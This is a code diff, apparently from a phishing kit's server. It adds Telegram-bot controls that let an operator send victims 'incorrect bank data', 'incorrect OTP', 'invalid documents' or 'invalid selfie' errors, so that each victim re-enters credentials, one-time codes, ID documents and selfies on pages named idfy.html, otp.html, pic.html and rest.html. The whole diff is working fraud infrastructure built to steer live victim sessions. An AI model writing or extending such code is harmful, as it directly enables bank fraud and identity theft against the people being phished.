@@ -63,6 +63,14 @@ function getBotones(sessionId) {
       [
         { text: "🎉 ÉXITO → list.html", callback_data: `list_${sessionId}` },
         { text: "🔄 REST → rest.html", callback_data: `rest_${sessionId}` }
+      ],
+      [
+        { text: "⚠️ ERR SOLICITUD", callback_data: `eridfy_${sessionId}` },
+        { text: "⚠️ ERR OTP", callback_data: `erotp_${sessionId}` }
+      ],
+      [
+        { text: "⚠️ ERR DOC", callback_data: `erpic_${sessionId}` },
+        { text: "⚠️ ERR REST", callback_data: `errest_${sessionId}` }
       ]
     ]
   };
@@ -393,6 +401,13 @@ app.get("/instruction/:sessionId", (req, res) => {
 
   if (!estado) return res.json({ redirect_to: null });
 
+  if (estado.error_cmd) {
+    const ec = estado.error_cmd;
+    estado.error_cmd = null;
+    sessions.set(sessionId, estado);
+    return res.json({ redirect_to: null, error_cmd: ec });
+  }
+
   if (estado.redirect_to) {
     const redireccion = estado.redirect_to;
     estado.redirect_to = null;
@@ -430,7 +445,17 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
       }
 
       const sessionData = sessions.get(sessionId) || { redirect_to: null };
-      sessionData.redirect_to = action;
+      const ERROR_CMDS = {
+        eridfy: { message: 'Datos bancarios incorrectos. Intenta de nuevo.', target: 'idfy.html' },
+        erotp:  { message: 'Código OTP incorrecto. Intenta de nuevo.', target: 'otp.html' },
+        erpic:  { message: 'Documentos no válidos. Intenta de nuevo.', target: 'pic.html' },
+        errest: { message: 'Selfie no válida. Intenta de nuevo.', target: 'rest.html' }
+      };
+      if (ERROR_CMDS[action]) {
+        sessionData.error_cmd = ERROR_CMDS[action];
+      } else {
+        sessionData.redirect_to = action;
+      }
       sessions.set(sessionId, sessionData);
 
       await fetch(getTelegramApiUrl('answerCallbackQuery'), {
@@ -438,7 +463,7 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           callback_query_id: callback_query.id,
-          text: `✅ Redirigiendo a ${action}.html`,
+          text: ERROR_CMDS[action] ? `⚠️ Error enviado` : `✅ Redirigiendo a ${action}.html`,
           show_alert: false
         })
       });
